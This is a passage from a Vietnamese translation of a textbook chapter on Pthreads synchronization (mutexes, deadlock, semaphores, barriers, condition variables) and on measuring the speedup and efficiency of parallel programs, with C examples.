    pthread_mutex_unlock(&amp;mutex); //release the mutex lock

    return NULL;
}
</code></pre>
<p>Phiên bản này có một vài đặc điểm bổ sung:</p>
<ul>
<li>
<p>Sự xuất hiện của <code>local_counts</code>, một mảng <strong>cục bộ</strong> trong phạm vi của từng thread (tức là được cấp phát trên stack của thread đó). Giống như <code>counts</code>, <code>local_counts</code> chứa <code>MAX</code> phần tử, với <code>MAX</code> là giá trị lớn nhất mà bất kỳ phần tử nào trong mảng đầu vào có thể có.</p>
</li>
<li>
<p>Mỗi thread cập nhật <code>local_counts</code> theo tốc độ riêng của nó, <strong>không</strong> có tranh chấp (contention) đối với biến chia sẻ.</p>
</li>
<li>
<p>Chỉ <strong>một</strong> lần gọi <code>pthread_mutex_lock</code> được dùng để bảo vệ việc mỗi thread cập nhật mảng <code>counts</code> toàn cục, và điều này chỉ diễn ra <strong>một lần</strong> ở cuối quá trình thực thi của thread.</p>
</li>
</ul>
<p>Bằng cách này, chúng ta giảm thời gian mỗi thread phải ở trong <strong>critical section</strong> xuống chỉ còn việc cập nhật mảng <code>counts</code> chia sẻ.<br />
Mặc dù tại một thời điểm chỉ một thread có thể vào critical section, nhưng thời gian mỗi thread ở đó <strong>tỷ lệ với <code>MAX</code></strong>, chứ không phải <em>n</em> (độ dài mảng toàn cục).<br />
Vì <code>MAX</code> nhỏ hơn rất nhiều so với <em>n</em>, chúng ta kỳ vọng sẽ thấy cải thiện về hiệu năng.</p>
<p>Bây giờ, hãy benchmark phiên bản này của chương trình:</p>
<pre><code>$ ./countElems_p_v3 100000000 0 1
Time for Step 1 is 0.334574 s

$ ./countElems_p_v3 100000000 0 2
Time for Step 1 is 0.209347 s

$ ./countElems_p_v3 100000000 0 4
Time for Step 1 is 0.130745 s
</code></pre>
<p>Thật tuyệt vời! Chương trình của chúng ta không chỉ cho ra kết quả <strong>đúng</strong>, mà còn chạy <strong>nhanh hơn</strong> khi tăng số lượng thread.</p>
<p>Bài học rút ra ở đây là: để <strong>tối thiểu hóa</strong> critical section một cách hiệu quả, hãy sử dụng <strong>biến cục bộ</strong> để thu thập các giá trị trung gian.<br />
Sau khi hoàn thành phần công việc nặng cần song song hóa, hãy dùng mutex để cập nhật an toàn các biến chia sẻ.</p>
<h4 id="deadlock"><a class="header" href="#deadlock">Deadlock</a></h4>
<p>Trong một số chương trình, các thread đang chờ nhau có thể phụ thuộc lẫn nhau.<br />
Một tình huống gọi là <strong>deadlock</strong> có thể xảy ra khi nhiều cấu trúc đồng bộ hóa như mutex được áp dụng <strong>sai cách</strong>.<br />
Một thread bị deadlock sẽ bị chặn bởi một thread khác, và thread đó <strong>cũng</strong> đang bị chặn bởi một thread đang bị chặn khác.<br />
<strong>Kẹt xe</strong> (gridlock), khi các xe ở mọi hướng không thể di chuyển vì bị chặn bởi các xe khác, là một ví dụ thực tế phổ biến của deadlock tại các giao lộ đông đúc.</p>
<p>Để minh họa deadlock trong code, hãy xét ví dụ sử dụng multithreading để triển khai một ứng dụng ngân hàng.<br />
Mỗi tài khoản người dùng được định nghĩa bởi số dư (<strong>balance</strong>) và một mutex riêng (đảm bảo không có race condition khi cập nhật số dư):</p>
<pre><code class="language-c">struct account {
    pthread_mutex_t lock;
    int balance;
};
</code></pre>
<p>Xét một cài đặt đơn giản của hàm <code>Transfer</code> để chuyển tiền từ một tài khoản ngân hàng sang tài khoản khác:</p>
<pre><code class="language-c">void *Transfer(void *args){
    // bỏ phần truyền tham số để dễ đọc hơn
    //...

    pthread_mutex_lock(&amp;fromAcct-&gt;lock);
    pthread_mutex_lock(&amp;toAcct-&gt;lock);

    fromAcct-&gt;balance -= amt;
    toAcct-&gt;balance += amt;

    pthread_mutex_unlock(&amp;fromAcct-&gt;lock);
    pthread_mutex_unlock(&amp;toAcct-&gt;lock);

    return NULL;
}
</code></pre>
<p>Giả sử Thread 0 và Thread 1 chạy đồng thời, lần lượt đại diện cho người dùng A và B.<br />
Xét tình huống A và B muốn chuyển tiền cho nhau:</p>
<ul>
<li>A muốn chuyển 20 đô cho B</li>
<li>B muốn chuyển 40 đô cho A</li>
</ul>
<p>Trong luồng thực thi được minh họa ở <strong>Hình 1</strong>, cả hai thread cùng lúc thực thi hàm <code>Transfer</code>:</p>
<ul>
<li>Thread 0 giữ khóa (<code>lock</code>) của <code>acctA</code></li>
<li>Thread 1 giữ khóa của <code>acctB</code></li>
</ul>
<p>Để tiếp tục, Thread 0 cần giữ khóa của <code>acctB</code> — nhưng khóa này đang do Thread 1 giữ.<br />
Tương tự, Thread 1 cần giữ khóa của <code>acctA</code> — nhưng khóa này đang do Thread 0 giữ.</p>
<p>Vì cả hai thread đều <strong>chặn</strong> nhau, chúng rơi vào trạng thái <strong>deadlock</strong>.</p>
<p><img src="C14-SharedMemory/_images/deadlock.png" alt="Two threads deadlocked with each other" /></p>
<p><strong>Hình 1.</strong> Ví dụ về deadlock</p>
<p>Mặc dù <strong>OS</strong> (hệ điều hành) cung cấp một số cơ chế bảo vệ chống lại deadlock, lập trình viên vẫn cần cẩn trọng khi viết code có thể làm tăng khả năng xảy ra deadlock.<br />
Ví dụ, kịch bản ở trên có thể tránh được bằng cách <strong>sắp xếp lại</strong> các thao tác khóa sao cho mỗi cặp <strong>lock/unlock</strong> chỉ bao quanh câu lệnh cập nhật số dư tương ứng:</p>
<pre><code class="language-c">void *Transfer(void *args){
    // bỏ phần truyền tham số để dễ đọc hơn
    //...

    pthread_mutex_lock(&amp;fromAcct-&gt;lock);
    fromAcct-&gt;balance -= amt;
    pthread_mutex_unlock(&amp;fromAcct-&gt;lock);

    pthread_mutex_lock(&amp;toAcct-&gt;lock);
    toAcct-&gt;balance += amt;
    pthread_mutex_unlock(&amp;toAcct-&gt;lock);

    return NULL;
}
</code></pre>
<p>Deadlock không phải là tình huống chỉ xảy ra với <strong>thread</strong>.<br />
Các <strong>process</strong> (đặc biệt là những process có giao tiếp với nhau) cũng có thể bị deadlock.<br />
Lập trình viên cần chú ý đến các <strong>synchronization primitive</strong> (nguyên thủy đồng bộ hóa) mà họ sử dụng và hậu quả của việc sử dụng chúng <strong>không đúng cách</strong>.</p>
<div style="break-before: page; page-break-before: always;"></div><h3 id="1432-semaphores"><a class="header" href="#1432-semaphores">14.3.2. Semaphores</a></h3>
<p><strong>Semaphore</strong> thường được sử dụng trong <strong>hệ điều hành</strong> và các chương trình <strong>concurrent</strong> (chạy đồng thời), với mục tiêu quản lý việc truy cập đồng thời vào một <strong>pool</strong> (bể) tài nguyên.<br />
Khi sử dụng semaphore, mục tiêu không phải là <em>ai</em> sở hữu cái gì, mà là <em>còn bao nhiêu</em> tài nguyên vẫn khả dụng.<br />
Semaphore khác với <strong>mutex</strong> ở một số điểm sau:</p>
<ul>
<li>
<p>Semaphore <strong>không nhất thiết</strong> phải ở trạng thái nhị phân (locked hoặc unlocked).<br />
Một loại đặc biệt gọi là <strong>counting semaphore</strong> (semaphore đếm) có giá trị từ 0 đến <em>r</em>, trong đó <em>r</em> là số lượng tài nguyên tối đa có thể có.<br />
Mỗi khi một tài nguyên được tạo ra, semaphore sẽ <strong>tăng</strong> giá trị.<br />
Mỗi khi một tài nguyên được sử dụng, semaphore sẽ <strong>giảm</strong> giá trị.<br />
Khi counting semaphore có giá trị 0, nghĩa là <strong>không còn tài nguyên khả dụng</strong>, và bất kỳ thread nào cố gắng lấy tài nguyên sẽ phải <strong>chờ</strong> (block).</p>
</li>
<li>
<p>Semaphore có thể <strong>mặc định ở trạng thái khóa</strong>.</p>
</li>
</ul>
<p>Mặc dù mutex và <strong>condition variable</strong> có thể mô phỏng chức năng của semaphore, nhưng trong một số trường hợp, sử dụng semaphore có thể <strong>đơn giản</strong> và <strong>hiệu quả</strong> hơn.<br />
Semaphore cũng có ưu điểm là <strong>bất kỳ thread nào</strong> cũng có thể mở khóa semaphore (khác với mutex, nơi thread gọi khóa phải là thread mở khóa).</p>
<p>Semaphore <strong>không</strong> phải là một phần của thư viện <strong>Pthreads</strong>, nhưng điều đó không có nghĩa là bạn không thể sử dụng chúng.<br />
Trên hệ thống Linux và macOS, các primitive semaphore có thể được truy cập từ <code>semaphore.h</code> (thường nằm trong <code>/usr/include</code>).<br />
Vì không có chuẩn chung, các lời gọi hàm có thể khác nhau giữa các hệ thống.<br />
Tuy nhiên, thư viện semaphore có các khai báo tương tự như mutex:</p>
<ul>
<li>
<p><strong>Khai báo</strong> một semaphore (kiểu <code>sem_t</code>, ví dụ: <code>sem_t semaphore</code>).</p>
</li>
<li>
<p><strong>Khởi tạo</strong> semaphore bằng <code>sem_init</code> (thường trong <code>main</code>).<br />
Hàm <code>sem_init</code> có 3 tham số:</p>
<ol>
<li>Địa chỉ của semaphore.</li>
<li>Trạng thái khởi tạo (locked hoặc unlocked).</li>
<li>Cho biết semaphore sẽ được chia sẻ giữa các thread của <strong>một process</strong> (ví dụ: giá trị 0) hay <strong>giữa các process</strong> (ví dụ: giá trị 1).</li>
</ol>
<p>Điều này hữu ích vì semaphore thường được dùng để đồng bộ hóa giữa các process.<br />
Ví dụ: <code>sem_init(&amp;semaphore, 1, 0)</code> nghĩa là semaphore ban đầu <strong>đang khóa</strong> (tham số thứ hai là 1) và được chia sẻ giữa các thread của cùng một process (tham số thứ ba là 0).<br />
Ngược lại, mutex luôn bắt đầu ở trạng thái <strong>unlocked</strong>.<br />
Lưu ý: trên macOS, hàm tương đương là <code>sem_open</code>.</p>
</li>
<li>
<p><strong>Hủy</strong> semaphore bằng <code>sem_destroy</code> (thường trong <code>main</code>).<br />
Hàm này chỉ nhận con trỏ tới semaphore: <code>sem_destroy(&amp;semaphore)</code>.<br />
Lưu ý: trên macOS, hàm tương đương có thể là <code>sem_unlink</code> hoặc <code>sem_close</code>.</p>
</li>
<li>
<p>Hàm <code>sem_wait</code> cho biết một tài nguyên đang được sử dụng và <strong>giảm</strong> giá trị semaphore.<br />
Nếu giá trị semaphore &gt; 0 (nghĩa là vẫn còn tài nguyên khả dụng), hàm sẽ trả về ngay và thread được phép tiếp tục.<br />
Nếu giá trị semaphore = 0, thread sẽ <strong>block</strong> cho đến khi có tài nguyên khả dụng (tức semaphore &gt; 0).<br />
Ví dụ: <code>sem_wait(&amp;semaphore)</code>.</p>
</li>
<li>
<p>Hàm <code>sem_post</code> cho biết một tài nguyên được giải phóng và <strong>tăng</strong> giá trị semaphore.<br />
Hàm này trả về ngay lập tức.<br />
Nếu có thread đang chờ semaphore (tức giá trị semaphore trước đó là 0), thread đó sẽ nhận quyền sử dụng tài nguyên vừa được giải phóng.<br />
Ví dụ: <code>sem_post(&amp;semaphore)</code>.</p>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h3 id="1433-các-cấu-trúc-đồng-bộ-hóa-khác-other-synchronization-constructs"><a class="header" href="#1433-các-cấu-trúc-đồng-bộ-hóa-khác-other-synchronization-constructs">14.3.3. Các cấu trúc đồng bộ hóa khác (Other Synchronization Constructs)</a></h3>
<p><strong>Mutex</strong> và <strong>semaphore</strong> không phải là những ví dụ duy nhất về cấu trúc đồng bộ hóa có thể được sử dụng trong ngữ cảnh các chương trình đa luồng.<br />
Trong tiểu mục này, chúng ta sẽ thảo luận ngắn gọn về hai cấu trúc đồng bộ hóa khác là <strong>barrier</strong> và <strong>condition variable</strong>, cả hai đều là một phần của thư viện <strong>Pthreads</strong>.</p>
<h4 id="barriers"><a class="header" href="#barriers">Barriers</a></h4>
<p><strong>Barrier</strong> là một loại cấu trúc đồng bộ hóa buộc <strong>tất cả</strong> các thread phải đạt đến một điểm chung trong quá trình thực thi trước khi cho phép chúng tiếp tục chạy song song.<br />
Pthreads cung cấp một primitive đồng bộ hóa dạng barrier.<br />
Để sử dụng barrier của Pthreads, cần thực hiện các bước sau:</p>
<ul>
<li>Khai báo một biến barrier toàn cục (ví dụ: <code>pthread_barrier_t barrier</code>)</li>
<li>Khởi tạo barrier trong <code>main</code> (<code>pthread_barrier_init(&amp;barrier)</code>)</li>
<li>Hủy barrier trong <code>main</code> sau khi sử dụng (<code>pthread_barrier_destroy(&amp;barrier)</code>)</li>
<li>Sử dụng hàm <code>pthread_barrier_wait</code> để tạo một điểm đồng bộ hóa.</li>
</ul>
<p>Chương trình sau minh họa cách sử dụng barrier trong một hàm có tên <code>threadEx</code>:</p>
<pre><code class="language-c">void *threadEx(void *args){
    // parse args
    // ...
    long myid = myargs-&gt;id;
    int nthreads = myargs-&gt;numthreads;
    int *array = myargs-&gt;array;

    printf(&quot;Thread %ld starting thread work!\n&quot;, myid);
    pthread_barrier_wait(&amp;barrier); // forced synchronization point
    printf(&quot;All threads have reached the barrier!\n&quot;);
    for (i = start; i &lt; end; i++) {
        array[i] = array[i] * 2;
    }
    printf(&quot;Thread %ld done with work!\n&quot;, myid);

    return NULL;
}
</code></pre>
<p>Trong ví dụ này, <strong>không thread nào</strong> có thể bắt đầu xử lý phần mảng được gán cho đến khi <strong>tất cả</strong> các thread đã in ra thông báo rằng chúng bắt đầu làm việc.<br />
Nếu không có barrier, có thể một thread đã hoàn thành công việc trước khi các thread khác kịp in thông báo bắt đầu.<br />
Lưu ý rằng <strong>vẫn</strong> có thể xảy ra trường hợp một thread in thông báo hoàn thành công việc trước khi một thread khác thực sự kết thúc.</p>
<h4 id="condition-variables"><a class="header" href="#condition-variables">Condition Variables</a></h4>
<p><strong>Condition variable</strong> buộc một thread phải <strong>block</strong> (chặn) cho đến khi một điều kiện cụ thể được thỏa coden.<br />
Cấu trúc này hữu ích trong các tình huống mà một điều kiện phải được đáp ứng trước khi thread thực hiện công việc.<br />
Nếu không có condition variable, thread sẽ phải liên tục kiểm tra xem điều kiện đã được đáp ứng chưa, gây tốn CPU.</p>
<p>Condition variable <strong>luôn</strong> được sử dụng cùng với mutex.<br />
Trong loại cấu trúc đồng bộ hóa này, mutex đảm bảo <strong>mutual exclusion</strong> (loại trừ lẫn nhau), trong khi condition variable đảm bảo rằng điều kiện cụ thể được đáp ứng trước khi một thread giành được mutex.</p>
<p>Condition variable trong POSIX có kiểu <code>pthread_cond_t</code>.<br />
Giống như mutex và barrier, condition variable phải được <strong>khởi tạo trước khi sử dụng</strong> và <strong>hủy sau khi sử dụng</strong>.</p>
<ul>
<li>Để khởi tạo condition variable, dùng hàm <code>pthread_cond_init</code>.</li>
<li>Để hủy condition variable, dùng hàm <code>pthread_cond_destroy</code>.</li>
</ul>
<p>Hai hàm thường được gọi khi sử dụng condition variable là <code>pthread_cond_wait</code> và <code>pthread_cond_signal</code>.<br />
Cả hai hàm này đều yêu cầu <strong>địa chỉ của một mutex</strong> ngoài địa chỉ của condition variable:</p>
<ul>
<li>
<p><code>pthread_cond_wait(&amp;cond, &amp;mutex)</code>: nhận địa chỉ của condition variable <code>cond</code> và mutex <code>mutex</code> làm tham số.<br />
Hàm này khiến thread gọi nó bị block trên condition variable <code>cond</code> cho đến khi một thread khác <strong>signal</strong> (đánh thức) nó.</p>
</li>
<li>
<p><code>pthread_cond_signal(&amp;cond)</code>: khiến thread gọi hàm này <strong>đánh thức</strong> một thread khác đang chờ trên condition variable <code>cond</code> (theo ưu tiên lập lịch).<br />
Nếu không có thread nào đang bị block trên condition đó, hàm sẽ không có tác dụng.<br />
Khác với <code>pthread_cond_wait</code>, hàm <code>pthread_cond_signal</code> có thể được gọi bởi một thread <strong>bất kể</strong> nó có đang giữ mutex liên quan hay không.</p>
</li>
</ul>
<h4 id="ví-dụ-về-condition-variable"><a class="header" href="#ví-dụ-về-condition-variable">Ví dụ về Condition Variable</a></h4>
<p>Thông thường, condition variable hữu ích nhất khi một nhóm thread đang chờ một nhóm khác hoàn thành một hành động nào đó.<br />
Trong ví dụ sau, chúng ta sử dụng nhiều thread để mô phỏng một nhóm <strong>nông dân</strong> thu thập trứng từ một nhóm <strong>gà</strong>.<br />
&quot;Chicken&quot; và &quot;Farmer&quot; đại diện cho hai lớp thread riêng biệt.<br />
Toàn bộ mã nguồn của chương trình này có thể tải tại <a href="C14-SharedMemory/_attachments/layeggs.c">layeggs.c</a>.<br />
Lưu ý rằng đoạn code liệt kê ở đây đã lược bỏ nhiều phần chú thích/xử lý lỗi để ngắn gọn.</p>
<pre><code class="language-c">int main(int argc, char **argv){
    //... declarations omitted for brevity

    // these will be shared by all threads via pointer fields in t_args
    int num_eggs;           // number of eggs ready to collect
    pthread_mutex_t mutex;  // mutex associated with cond variable
    pthread_cond_t  eggs;   // used to block/wake-up farmer waiting for eggs

    //... args parsing removed for brevity

    num_eggs = 0; // number of eggs ready to collect
    ret = pthread_mutex_init(&amp;mutex, NULL); //initialize the mutex
    pthread_cond_init(&amp;eggs, NULL); //initialize the condition variable

    //... thread_array and thread_args creation/filling omitted for brevity

    // create some chicken and farmer threads
    for (i = 0; i &lt; (2 * nthreads); i++) {
        if ( (i % 2) == 0 ) {
            ret = pthread_create(&amp;thread_array[i], NULL,
                                 chicken, &amp;thread_args[i]);
        }
        else {
            ret = pthread_create(&amp;thread_array[i], NULL,
                                 farmer, &amp;thread_args[i] );
        }
    }

    // wait for chicken and farmer threads to exit
    for (i = 0; i &lt; (2 * nthreads); i++)  {
        ret = pthread_join(thread_array[i], NULL);
    }

    // clean-up program state
    pthread_mutex_destroy(&amp;mutex); //destroy the mutex
    pthread_cond_destroy(&amp;eggs);   //destroy the cond var

    return 0;
}
</code></pre>
<p>Hàm <code>main</code> tạo một biến chia sẻ <code>num_eggs</code> (biểu thị tổng số trứng hiện có tại bất kỳ thời điểm nào), một <code>mutex</code> chia sẻ (được sử dụng mỗi khi một thread truy cập <code>num_eggs</code>), và một condition variable chia sẻ <code>eggs</code>.<br />
Sau đó, nó tạo <strong>hai thread Chicken</strong> và <strong>hai thread Farmer</strong>.</p>
<p>Mỗi <strong>Chicken thread</strong> (thread “gà”) chịu trách nhiệm đẻ một số lượng trứng nhất định:</p>
<pre><code class="language-c">void *chicken(void *args ) {
    struct t_arg *myargs = (struct t_arg *)args;
    int *num_eggs, i, num;

    num_eggs = myargs-&gt;num_eggs;
    i = 0;

    // lay some eggs
    for (i = 0; i &lt; myargs-&gt;total_eggs; i++) {
        usleep(EGGTIME); //chicken sleeps

        pthread_mutex_lock(myargs-&gt;mutex);
        *num_eggs = *num_eggs + 1;  // update number of eggs
        num = *num_eggs;
        pthread_cond_signal(myargs-&gt;eggs); // wake a sleeping farmer (squawk)
        pthread_mutex_unlock(myargs-&gt;mutex);

        printf(&quot;chicken %d created egg %d available %d\n&quot;,myargs-&gt;id,i,num);
    }
    return NULL;
}
</code></pre>
<p>Để đẻ một quả trứng, Chicken thread sẽ <strong>ngủ</strong> một lúc, sau đó <strong>giành mutex</strong> và cập nhật tổng số trứng hiện có (<code>num_eggs</code>) tăng thêm 1.<br />
Trước khi <strong>nhả mutex</strong>, Chicken thread sẽ <strong>đánh thức</strong> một Farmer thread đang ngủ (có thể là bằng tiếng kêu “cục tác”).<br />
Chicken thread lặp lại chu trình này cho đến khi đẻ hết số trứng mà nó dự định (<code>total_eggs</code>).</p>
<p>Mỗi <strong>Farmer thread</strong> (thread “nông dân”) chịu trách nhiệm thu thập <code>total_eggs</code> quả trứng từ đàn gà (có thể là để ăn sáng):</p>
<pre><code class="language-c">void *farmer(void *args ) {
    struct t_arg * myargs = (struct t_arg *)args;
    int *num_eggs, i, num;

    num_eggs = myargs-&gt;num_eggs;

    i = 0;

    for (i = 0; i &lt; myargs-&gt;total_eggs; i++) {
        pthread_mutex_lock(myargs-&gt;mutex);
        while (*num_eggs == 0 ) { // no eggs to collect
            // wait for a chicken to lay an egg
            pthread_cond_wait(myargs-&gt;eggs, myargs-&gt;mutex);
        }

        // we hold mutex lock here and num_eggs &gt; 0
        num = *num_eggs;
        *num_eggs = *num_eggs - 1;
        pthread_mutex_unlock(myargs-&gt;mutex);

        printf(&quot;farmer %d gathered egg %d available %d\n&quot;,myargs-&gt;id,i,num);
    }
    return NULL;
}
</code></pre>
<p>Mỗi Farmer thread sẽ <strong>giành mutex</strong> trước khi kiểm tra biến chia sẻ <code>num_eggs</code> để xem có trứng nào sẵn sàng không (<code>*num_eggs == 0</code>).<br />
Trong khi <strong>không có</strong> trứng, Farmer thread sẽ <strong>block</strong> (tức là “ngủ”).</p>
<p>Sau khi Farmer thread được “đánh thức” bởi tín hiệu từ một Chicken thread, nó sẽ kiểm tra lại xem trứng vẫn còn không (vì có thể một Farmer khác đã lấy trước).<br />
Nếu còn, Farmer sẽ “thu thập” trứng (giảm <code>num_eggs</code> đi 1) và <strong>nhả mutex</strong>.</p>
<p>Theo cách này, Chicken và Farmer phối hợp nhịp nhàng để đẻ và thu thập trứng.<br />
<strong>Condition variable</strong> đảm bảo rằng không Farmer thread nào thu thập trứng cho đến khi trứng được đẻ bởi một Chicken thread.</p>
<h4 id="broadcasting"><a class="header" href="#broadcasting">Broadcasting</a></h4>
<p>Một hàm khác được sử dụng với condition variable là <code>pthread_cond_broadcast</code>, hữu ích khi <strong>nhiều thread</strong> đang bị block trên cùng một điều kiện.<br />
Gọi <code>pthread_cond_broadcast(&amp;cond)</code> sẽ <strong>đánh thức tất cả</strong> các thread đang bị block trên condition <code>cond</code>.</p>
<p>Trong ví dụ tiếp theo, chúng ta sẽ thấy cách condition variable có thể triển khai cơ chế <strong>barrier</strong> đã được thảo luận trước đó:</p>
<pre><code class="language-c">// mutex (initialized in main)
pthread_mutex_t mutex;

// condition variable signifying the barrier (initialized in main)
pthread_cond_t barrier;

void *threadEx_v2(void *args){
    // parse args
    // ...

    long myid = myargs-&gt;id;
    int nthreads = myargs-&gt;numthreads;
    int *array = myargs-&gt;array

    // counter denoting the number of threads that reached the barrier
    int *n_reached = myargs-&gt;n_reached;

    // start barrier code
    pthread_mutex_lock(&amp;mutex);
    *n_reached++;

    printf(&quot;Thread %ld starting work!\n&quot;, myid)

    // if some threads have not reached the barrier
    while (*n_reached &lt; nthreads) {
        pthread_cond_wait(&amp;barrier, &amp;mutex);
    }
    // all threads have reached the barrier
    printf(&quot;all threads have reached the barrier!\n&quot;);
    pthread_cond_broadcast(&amp;barrier);

    pthread_mutex_unlock(&amp;mutex);
    // end barrier code

    // normal thread work
    for (i = start; i &lt; end; i++) {
        array[i] = array[i] * 2;
    }
    printf(&quot;Thread %ld done with work!\n&quot;, myid);

    return NULL;
}
</code></pre>
<p>Hàm <code>threadEx_v2</code> có chức năng giống hệt <code>threadEx</code>.<br />
Trong ví dụ này, condition variable được đặt tên là <code>barrier</code>.<br />
Khi mỗi thread giành được lock, nó sẽ tăng biến <code>n_reached</code> — số lượng thread đã đến điểm barrier.<br />
Trong khi số thread đã đến barrier <strong>nhỏ hơn</strong> tổng số thread, thread sẽ <strong>chờ</strong> trên condition variable <code>barrier</code> và mutex <code>mutex</code>.</p>
<p>Tuy nhiên, khi <strong>thread cuối cùng</strong> đến barrier, nó sẽ gọi <code>pthread_cond_broadcast(&amp;barrier)</code>, giải phóng <strong>tất cả</strong> các thread khác đang chờ trên condition variable <code>barrier</code>, cho phép chúng tiếp tục thực thi.</p>
<p>Ví dụ này hữu ích để minh họa hàm <code>pthread_cond_broadcast</code>;<br />
tuy nhiên, tốt nhất là nên sử dụng <strong>Pthreads barrier primitive</strong> bất cứ khi nào cần barrier trong chương trình.</p>
<p>Một câu hỏi mà sinh viên thường đặt ra là:<br />
Vòng lặp <code>while</code> bao quanh lời gọi <code>pthread_cond_wait</code> trong code <code>farmer</code> và <code>threadEx_v2</code> có thể thay bằng câu lệnh <code>if</code> không?</p>
<p>Câu trả lời là <strong>không</strong> — vòng lặp <code>while</code> này <strong>hoàn toàn cần thiết</strong> vì hai lý do chính:</p>
<ol>
<li>
<p><strong>Điều kiện có thể thay đổi</strong> trước khi thread vừa được đánh thức kịp tiếp tục thực thi.<br />
Vòng lặp <code>while</code> đảm bảo điều kiện được kiểm tra lại một lần cuối.</p>
</li>
<li>
<p>Hàm <code>pthread_cond_wait</code> có thể gặp <strong>spurious wakeups</strong> — tình huống một thread bị đánh thức <strong>nhầm</strong> ngay cả khi điều kiện chưa được thỏa coden.</p>
</li>
</ol>
<p>Vòng lặp <code>while</code> ở đây chính là một ví dụ của <strong>predicate loop</strong>, buộc phải kiểm tra lại condition variable trước khi nhả mutex.<br />
Vì vậy, việc sử dụng <strong>predicate loop</strong> là <strong>thực hành đúng đắn</strong> khi làm việc với condition variable.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="144-Đo-lường-hiệu-năng-của-các-chương-trình-song-song-measuring-the-performance-of-parallel-programs"><a class="header" href="#144-Đo-lường-hiệu-năng-của-các-chương-trình-song-song-measuring-the-performance-of-parallel-programs">14.4. Đo lường hiệu năng của các chương trình song song (Measuring the Performance of Parallel Programs)</a></h2>
<p>Cho đến nay, chúng ta đã sử dụng hàm <code>gettimeofday</code> để đo lượng thời gian mà chương trình cần để thực thi.<br />
Trong phần này, chúng ta sẽ thảo luận cách đo lường <strong>mức độ hiệu quả</strong> của một chương trình song song so với một chương trình tuần tự, cũng như các chủ đề khác liên quan đến việc đo lường hiệu năng của các chương trình song song.</p>
<p>Trước tiên, chúng ta sẽ đề cập đến một số khái niệm cơ bản liên quan đến hiệu năng song song:</p>
<ul>
<li><strong>Speedup</strong> (tăng tốc)</li>
<li><strong>Efficiency</strong> (hiệu suất)</li>
<li><strong>Amdahl’s Law</strong> (Định luật Amdahl)</li>
</ul>
<p>Mặc dù <strong>Amdahl’s Law</strong> và <strong>speedup</strong> là hai khái niệm rất quan trọng liên quan đến hiệu năng, nhưng việc hiểu rõ thêm các chủ đề sau sẽ giúp người đọc có cái nhìn toàn diện hơn về hiệu năng:</p>
<ul>
<li><a href="C14-SharedMemory/performance_advanced.html#_gustafson_barsis_law"><strong>Gustafson–Barsis Law</strong></a></li>
<li><strong>Scalability</strong> (khả năng mở rộng)</li>
</ul>
<p>Cụ thể, <strong>Gustafson–Barsis Law</strong> cung cấp một góc nhìn rõ hơn về <strong>giới hạn</strong> của Amdahl’s Law.</p>
<div style="break-before: page; page-break-before: always;"></div><h3 id="1441-kiến-thức-cơ-bản-về-hiệu-năng-song-song-parallel-performance-basics"><a class="header" href="#1441-kiến-thức-cơ-bản-về-hiệu-năng-song-song-parallel-performance-basics">14.4.1. Kiến thức cơ bản về hiệu năng song song (Parallel Performance Basics)</a></h3>
<h4 id="speedup-tăng-tốc"><a class="header" href="#speedup-tăng-tốc">Speedup (Tăng tốc)</a></h4>
<p>Giả sử một chương trình mất thời gian T~<em>c</em>~ để thực thi trên <em>c</em> core.<br />
Như vậy, phiên bản <strong>tuần tự</strong> của chương trình sẽ mất thời gian T~1~ để chạy.</p>
<p><strong>Speedup</strong> của chương trình trên <em>c</em> core được biểu diễn bằng công thức:</p>
<p><img src="C14-SharedMemory/_images/speedup.png" alt="speedup" /></p>
<p>Ví dụ: nếu một chương trình tuần tự mất 60 giây để chạy, trong khi phiên bản song song của nó mất 30 giây trên 2 core, thì <strong>speedup</strong> tương ứng là 2.<br />
Tương tự, nếu chương trình đó mất 15 giây trên 4 core, thì speedup là 4.<br />
Trong kịch bản lý tưởng, một chương trình chạy trên <em>n</em> core với <em>n</em> thread sẽ có speedup bằng <em>n</em>.</p>
<p>Nếu speedup của chương trình <strong>lớn hơn 1</strong>, điều đó cho thấy việc song song hóa đã mang lại cải thiện hiệu năng.<br />
Nếu speedup <strong>nhỏ hơn 1</strong>, thì giải pháp song song thực tế còn chậm hơn giải pháp tuần tự.<br />
Cũng có thể xảy ra trường hợp speedup <strong>lớn hơn <em>n</em></strong> (ví dụ: do hiệu ứng phụ của việc có thêm cache giúp giảm số lần truy cập bộ nhớ).<br />
Những trường hợp này được gọi là <strong>superlinear speedup</strong> (tăng tốc siêu tuyến tính).</p>
<h4 id="efficiency-hiệu-suất"><a class="header" href="#efficiency-hiệu-suất">Efficiency (Hiệu suất)</a></h4>
<p>Speedup <strong>không</strong> tính đến số lượng core — nó chỉ đơn thuần là tỷ lệ giữa thời gian chạy tuần tự và thời gian chạy song song.<br />
Ví dụ: nếu một chương trình tuần tự mất 60 giây, nhưng chương trình song song mất 30 giây trên <strong>4 core</strong>, thì speedup vẫn là 2.<br />
Tuy nhiên, chỉ số này <strong>không phản ánh</strong> việc chương trình đã chạy trên 4 core.</p>
<p>Để đo <strong>tốc độ tăng trên mỗi core</strong>, ta sử dụng <strong>efficiency</strong>:</p>
<p><img src="C14-SharedMemory/_images/efficiency.png" alt="efficiency" /></p>
<p>Efficiency thường nằm trong khoảng từ 0 đến 1.</p>
<ul>
<li>Efficiency = 1 nghĩa là các core được sử dụng <strong>hoàn hảo</strong>.</li>
<li>Nếu efficiency gần 0, thì song song hóa hầu như <strong>không mang lại lợi ích</strong>, vì thêm core không cải thiện hiệu năng.</li>
<li>Nếu efficiency &gt; 1, điều đó cho thấy có <strong>superlinear speedup</strong>.</li>
</ul>
<p>Xét lại ví dụ trước:</p>
<ul>
<li>Chương trình tuần tự mất 60 giây.</li>
<li>Nếu phiên bản song song mất 30 giây trên <strong>2 core</strong>, efficiency = 1 (100%).</li>
<li>Nếu mất 30 giây trên <strong>4 core</strong>, efficiency giảm xuống 0.5 (50%).</li>
</ul>
<h4 id="hiệu-năng-song-song-trong-thực-tế"><a class="header" href="#hiệu-năng-song-song-trong-thực-tế">Hiệu năng song song trong thực tế</a></h4>
<p>Trong thế giới lý tưởng, speedup là <strong>tuyến tính</strong>: mỗi đơn vị tính toán bổ sung sẽ mang lại mức tăng tốc tương ứng.<br />
Tuy nhiên, điều này <strong>hiếm khi</strong> xảy ra trong thực tế.</p>
<p>Hầu hết các chương trình đều chứa một phần <strong>bắt buộc phải tuần tự</strong> do các phụ thuộc nội tại trong code.<br />
Chuỗi phụ thuộc dài nhất trong một chương trình được gọi là <strong>critical path</strong> (đường tới hạn).<br />
